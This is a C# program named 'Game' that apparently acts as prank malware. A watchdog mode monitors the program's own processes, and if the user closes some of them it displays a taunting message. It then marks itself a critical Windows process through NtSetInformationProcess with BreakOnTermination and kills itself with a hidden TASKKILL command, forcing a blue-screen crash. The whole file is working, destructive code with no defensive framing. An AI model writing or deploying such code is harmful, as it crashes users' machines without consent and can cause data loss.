using System.Diagnostics;
using System.Runtime.InteropServices;
namespace Game
{
    internal static class Program
    {
        static void TaskKill(string ProcessName)
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            p.StandardInput.WriteLine("TASKKILL /F /IM \"" + ProcessName + ".exe\"&EXIT");
            //MessageBox.Show(p.StandardOutput.ReadToEnd());
            p.WaitForExit();
            p.Close();
        }
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                // To customize application configuration such as set high DPI settings or default font,
                // see https://aka.ms/applicationconfiguration.
                ApplicationConfiguration.Initialize();
                Application.Run(new Form1());
            }
            else if (args[0] == "StartWatchDog")
            {
                Thread.Sleep(500);
                while (true)
                {
                    int programRunning = 0;
                    Process[] myproc = Process.GetProcesses();
                    foreach (Process item in myproc)
                    {
                        //MessageBox.Show(item.ProcessName);
                        if (item.ProcessName == Process.GetCurrentProcess().ProcessName)
                        {
                            programRunning += 1;
                        }
                    }
                    if (programRunning < 8)
                    {
                        new Thread(() => MessageBox.Show("Why did you kill the kask?\nBSOD incoming!", "loser!!")).Start();
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.CreateNoWindow = true;
                        p.Start();
                        p.StandardInput.WriteLine("\"" + Application.ExecutablePath + "\" BSOD&EXIT");
                        //MessageBox.Show(p.StandardOutput.ReadToEnd());
                        p.WaitForExit();
                        p.Close();
                    }
                    Thread.Sleep(50);
                }
            }
            else if (args[0] == "BSOD")
            {
                Thread.Sleep(1000);
                int isCritical = 1;
                int BreakOnTermination = 0x1D;
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                for (int i = 1; i < 8; i++)
                {
                    TaskKill(Process.GetCurrentProcess().ProcessName);
                }
            }
        }
    }
}